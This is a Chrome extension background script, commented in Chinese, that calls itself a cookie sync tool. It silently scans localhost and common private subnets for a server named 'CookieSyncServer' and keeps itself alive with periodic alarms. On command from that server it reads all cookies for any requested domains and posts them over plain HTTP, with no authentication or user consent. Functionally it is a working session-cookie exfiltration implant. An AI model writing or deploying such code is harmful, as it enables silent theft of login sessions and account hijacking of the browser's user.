let socket = null;
let currentUrl = ''; 
let isConnected = false;
let isScanning = false;

// 1. 初始化启动 - 立即尝试连接，不等待
async function init() {
  // 立即尝试连接之前保存的服务器
  const data = await new Promise(resolve => chrome.storage.local.get(['serverUrl'], resolve));
  if (data.serverUrl) {
    currentUrl = data.serverUrl;
    connectWebSocket(currentUrl);
  } else {
    startSilentDiscovery();
  }
  // 创建周期性 alarm 以保持 Service Worker 活跃（使用较短周期）
  chrome.alarms.create('keep-alive', { periodInMinutes: 0.5, delayInMinutes: 0.1 });
}
init();

// 2. 消息监听
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'GET_STATUS') {
        sendResponse({ connected: isConnected, url: currentUrl, scanning: isScanning });
        return true; 
    }
    if (message.action === 'UPDATE_URL') {
        currentUrl = message.serverUrl;
        chrome.storage.local.set({ serverUrl: currentUrl });
        connectWebSocket(currentUrl);
        sendResponse({ success: true });
        return true;
    }
});

// 2.5 Alarm 监听器 - 用于唤醒休眠的 Service Worker
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'keep-alive') {
        if (!isConnected && !isScanning) {
            if (currentUrl) {
                connectWebSocket(currentUrl);
            } else {
                startSilentDiscovery();
            }
        }
    }
});

// 3. 全自动静默发现引擎
async function startSilentDiscovery() {
    if (isScanning || isConnected) return;
    isScanning = true;
    console.log('Starting silent discovery...');

    const subnets = ['127.0.0.1', '192.168.0', '192.168.1', '192.168.31', '192.168.2', '10.0.0'];
    const port = '3000';

    for (const subnet of subnets) {
        if (isConnected) break;
        console.log(`Scanning subnet: ${subnet}`);
        
        let batchSize = 20;
        for (let i = 1; i <= 255; i += batchSize) {
            if (isConnected) break;
            
            const promises = [];
            for (let j = i; j < i + batchSize && j <= 255; j++) {
                const ip = subnet === '127.0.0.1' ? subnet : `${subnet}.${j}`;
                promises.push(checkServer(ip, port));
                if (subnet === '127.0.0.1') break; 
            }
            
            await Promise.all(promises);
        }
    }
    
    isScanning = false;
    // 如果没找到，5分钟后重试
    if (!isConnected) {
        setTimeout(startSilentDiscovery, 5 * 60 * 1000);
    }
}

async function checkServer(ip, port) {
    if (isConnected) return;
    const url = `${ip}:${port}`;
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 800);
        
        const resp = await fetch(`http://${url}/ping`, { signal: controller.signal });
        const data = await resp.json();
        
        if (data && data.app === 'CookieSyncServer') {
            console.log(`Found server at: ${url}`);
            currentUrl = url;
            chrome.storage.local.set({ serverUrl: url });
            connectWebSocket(url);
        }
        clearTimeout(timeoutId);
    } catch (e) {
        // 忽略网络错误
    }
}

function connectWebSocket(url) {
    if (socket) socket.close();
    if (!url) return;
    
    let wsUrl = url.includes('://') ? url.replace('http', 'ws') : `ws://${url}`;
    if (!wsUrl.includes('/live')) wsUrl = wsUrl.endsWith('/') ? wsUrl + 'live' : wsUrl + '/live';

    socket = new WebSocket(wsUrl);

    socket.onopen = () => {
        console.log('Sender WS Connected to ' + wsUrl);
        isConnected = true;
        isScanning = false;
    };

    socket.onmessage = async (event) => {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'EXTRACT_COOKIES_REQUEST' && data.domains) {
                const cookiesToSync = [];
                for (const domain of data.domains) {
                    const cookies = await chrome.cookies.getAll({ domain });
                    cookiesToSync.push(...cookies);
                }

                if (cookiesToSync.length > 0) {
                    const hostUrl = 'http://' + currentUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
                    await fetch(`${hostUrl}/update`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            domain: data.domains.join(', '),
                            cookies: cookiesToSync
                        })
                    });
                }
            }
        } catch (e) {}
    };

    socket.onclose = () => {
        isConnected = false;
        // 断开后尝试重连或重新搜索
        setTimeout(() => {
            if (currentUrl) connectWebSocket(currentUrl);
            else startSilentDiscovery();
        }, 5000);
    };
}
